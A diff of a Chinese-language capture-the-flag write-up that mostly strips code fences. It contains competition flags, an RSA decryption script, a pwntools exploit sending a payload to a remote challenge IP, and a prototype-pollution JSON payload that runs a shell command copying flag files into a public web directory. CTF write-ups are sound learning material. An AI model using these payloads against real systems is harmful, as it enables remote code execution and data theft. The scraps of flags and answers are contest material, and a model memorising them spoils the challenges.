@@ -25,7 +25,8 @@ flag{youthful_and_upward}*
 
 这里先登录容器，读取passwd的内容
 
-看到了backdoor:x:0:1000::/home/backdoor:/sbin/nologin用户
+看到了backdoor:x:0:
+1000::/home/backdoor:/sbin/nologin用户
 
 userdel发现被进程占用，kill发现没有此进程，于是我多执行了几次
 
@@ -243,35 +244,10 @@ flag{b982846a-3046-4510-bd2e-3025720b902e}
 
 ```
 flag{youthful_and_upward}*
-```
-
-
-
-```
 flag{943f9194-97a1-497f-80ef-0fbe530acfa9}
-```
-
-
-
-```
 flag{passion_is_the_greatest_teacher}
-```
-
-
-
-```
 flag{2834d185-a1da-4fb1-8bac-59076eb6a634}
-```
-
-
-
-```
 Result: flag{6e80563b-21b2-4a70-a809-ec0893c18ccb}
-```
-
-
-
-```
 from gmpy2 import next_prime 
  def count_valid_sequences(length): 
     # dp[i] 表示长度为 i 的序列的状态计数 
@@ -302,21 +278,11 @@ print(f'有效序列数量: {key}') 
  
 # 计算下一个素数 p 
 p = next_prime(key) print(f'下一个素数 p: {p}')
-```
-
-
-
-```
 24440283427735860782323152407294917357529111353275570975703531438440519660225708967888657253
 64427800078326382055838870159237061508814094709689813408133059130198436029031864197061748902 16267523608158858125831762518730312396384937620710475882976270322032939857089942188526628386 40238623254740905447146670999830187552717802257362427107073858485019955606331947972091793616
 37334782511960032885588524607289079855161653463624702398395903704647522936182554978084504934
 17191451790994526255238552591985818658552348031882988499108633770981401584062453996779125024
 44220011884063994451182221171275547685147549629637310805120817903
-```
-
-
-
-```
 from Crypto.Util.number import * from sympy import mod_inverse 
  
 n  = 
@@ -361,17 +327,7 @@ flag = long_to_bytes(woshim).decode() 
     print("The flag starts with 'FLAG{'") elif len(flag) > 100: 
     print("The flag is longer than 100 characters") else: 
     print("The flag is:", flag)
-```
-
-
-
-```
 flag{77310934-21fa-4ee4-a783-dc1865ebab28}
-```
-
-
-
-```
 from pwn import * 
 context(log_level="debug")  # 设置调试级别，以便输出调试信息 r = remote("39.106.48.123", 27711)  # 连接到远程服务 
 # 定义程序中重要地址 
@@ -400,37 +356,12 @@ r.send(payload) 
  
 # 进入交互模式 
 r.interactive()
-```
-
-
-
-```
 flag{d919441c-3a49-4585-b174-9ddb1a9652be}
-```
-
-
-
-```
 flag{3ae3e580-f404-4f99-9f5f-8641f39ea537}
-```
-
-
-
-```
 flag{bc7ee4c8-b113-4805-9593-348a3ecb795d}
-```
-
-
-
-```
 {"__proto__":{"block":{ "type":"Text", 
 "line":"process.mainModule.require('child_process').exec('cat /f* >> 
 /app/public/js/sunmuteam.txt')"}}}
-```
-
-
-
-```
 flag{b982846a-3046-4510-bd2e-3025720b902e}
 ```
 
